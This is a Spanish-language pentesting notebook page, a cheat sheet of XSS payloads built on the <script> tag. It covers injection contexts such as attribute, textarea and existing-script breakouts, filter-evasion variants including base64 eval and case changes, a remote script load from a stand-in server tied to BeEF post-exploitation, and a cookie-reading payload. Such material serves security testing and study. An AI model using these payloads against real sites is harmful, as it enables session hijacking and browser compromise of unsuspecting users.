---
aliases:
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Etiqueta `<script>` Estándar

***

## Cheatsheet

|                         **Vector / Payload**                          |                         **Contexto de Inyección**                         |                                                                                         **Análisis de la Estructura y Uso**                                                                                         |
| :-------------------------------------------------------------------: | :-----------------------------------------------------------------------: | :-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|            <pre><code>`<script>alert(1)</script>`<br><br>             |                             <br>HTML general.                             |                   <br>El vector más básico y directo. Verifica instantáneamente si el motor de renderizado del navegador procesa las etiquetas de apertura y cierre para ejecutar código nativo.                    |
| <br><pre><code>`<script src="https://mi-servidor.com/x.js"></script>` |                   <br><br>HTML general (Carga remota).                    |      <br><br>Fundamental para la explotación real. Permite importar payloads complejos, evadir límites de longitud de caracteres en el input y conectar con frameworks de post-explotación (ej. BeEF).<br><br>      |
|             <br><pre><code>`"><script>alert(1)</script>`              |            <br>Reflejo dentro de un atributo (ej. `value=""`).            |       <br>Escapa del contexto del atributo cerrando las comillas y la etiqueta anfitriona original (como un `<input>`), forzando al navegador a interpretar el `<script>` como un nuevo bloque HTML.<br><br>        |
|         <br><pre><code>`</textarea><script>alert(1)</script>`         | <br>Reflejo en bloques de texto plano (`<textarea>`, `<title>`, `<xmp>`). |       <br>Estas etiquetas tratan todo su contenido interno como texto inerte. Es estrictamente necesario cerrarlas primero explícitamente para que la inyección sea parseada como código ejecutable.<br><br>        |
|        <br><pre><code>`';}</script><script>alert(1)</script>`         |      <br>Reflejo dentro de un bloque `<script>` legítimo existente.       | <br>Rompe la cadena de texto de la variable original, cierra el bloque de script preexistente para evitar errores de sintaxis residuales, y abre un entorno de ejecución completamente limpio y controlado.<br><br> |
|           <br><pre><code>`<script defer>alert(1)</script>`            |                     <br><br>Filtros léxicos básicos.                      |  <br>Evasión de WAF o listas negras simples que buscan la cadena exacta `<script>`. La inclusión de atributos estándar de HTML5 como `defer`, `async` o `type="text/javascript"` altera la firma esperada.<br><br>  |
|       <pre><code>`<script>eval(atob('YWxlcnQoMSk='))</script>`        |                   <br><br>Filtros de contenido interno.                   |      <br>Oculta el payload malicioso (ej. `alert(1)`) de los filtros que analizan el texto entre las etiquetas. Decodifica el string en Base64 en tiempo de ejecución y lo pasa a la función `eval()`.<br><br>      |
|                      <br>`alert(window.origin)`                       |                                <br>**TIP**                                |                                                             <br>En vez de usar alert(1) es preferible usar alert(window.origin) para saltar el IFrame.                                                              |
|                             `<plaintext>`                             |                               **Variante**                                |                                                              Forma rápida para ver si existe vulnerabilidad XSS en caso de que `alert` esté bloqueado.                                                              |
|                      `<script>print()</script>`                       |                               **Variante**                                |                                                                                              Lo mismo que el anterior.                                                                                              |
|               `<script>alert(document.cookie)</script>`               |                               **Variante**                                |                                                                                            Devuelve la cookie de sesión.                                                                                            |
^xss-script

```ad-tip
Muchas aplicaciones web modernas utilizan IFrames entre dominios para gestionar las entradas de los usuarios, de modo que, aunque el formulario web sea vulnerable a XSS, no supondría una vulnerabilidad para la aplicación web principal. Por eso es preferible usar el valor de window.origin en el cuadro de alerta, en lugar de un valor estático como 1. En este caso, el cuadro de alerta revelaría la URL en la que se está ejecutando y confirmaría qué formulario es el vulnerable, en caso de que se estuviera utilizando un IFrame.
```

### Ruptura de Contextos Existentes

Cuando la entrada no se refleja en el cuerpo general del HTML, sino dentro de otras estructuras preexistentes, es mandatorio escapar o cerrar ese entorno antes de inyectar la etiqueta `<script>`.

- **Salida de Atributos HTML:** Si el reflejo ocurre dentro del valor de un atributo (ej. un `<input>`), se debe cerrar la cadena y la etiqueta base:
    `"><script>alert(1)</script>`
- **Salida de Bloques de Texto Protectores:** Etiquetas como `<textarea>`, `<title>` o `<xmp>` tratan todo su contenido como texto sin formato. Es necesario cerrarlas explícitamente:
    `</textarea><script>alert(1)</script>`
- **Inyección dentro de un Script Existente:** Si el reflejo aterriza dentro de un bloque de JavaScript legítimo, la forma más segura de tomar el control es cerrar el script original y abrir uno nuevo, neutralizando errores de sintaxis:
    `';}</script><script>alert(1)</script>`


### Modificaciones para Evasión de Filtros Simples

Si el sistema bloquea el payload básico pero no implementa un bloqueo de caracteres especiales (como `<` o `>`), estas variaciones de la etiqueta `<script>` suelen ser efectivas contra listas negras superficiales:
- **Alternancia de Mayúsculas y Minúsculas:** `<sCrIpT>alert(1)</ScRiPt>` (aprovecha la tolerancia de HTML).
- **Inclusión de Espacios Nulos o Blancos:** `<script >alert(1)</script>` o `<script/src="http://x.js"></script>` (rompe expresiones regulares mal diseñadas que buscan `<script>` sin variaciones de espaciado).


***

## Overview

La inyección de la etiqueta `<script>` representa la forma más clásica, directa y fundamental de ejecutar un ataque de [[Cross-Site Scripting (XSS)]]. Este vector asume que la aplicación web refleja la entrada en el [[DOM]] permitiendo la estructura de etiquetas HTML y que no neutraliza de forma explícita la palabra clave `script`.

El objetivo aquí no es depender de manejadores de eventos (como `onerror` o `onload`), sino forzar al motor de renderizado del navegador a abrir un nuevo contexto de ejecución de JavaScript y procesar el código suministrado de forma inmediata.


***

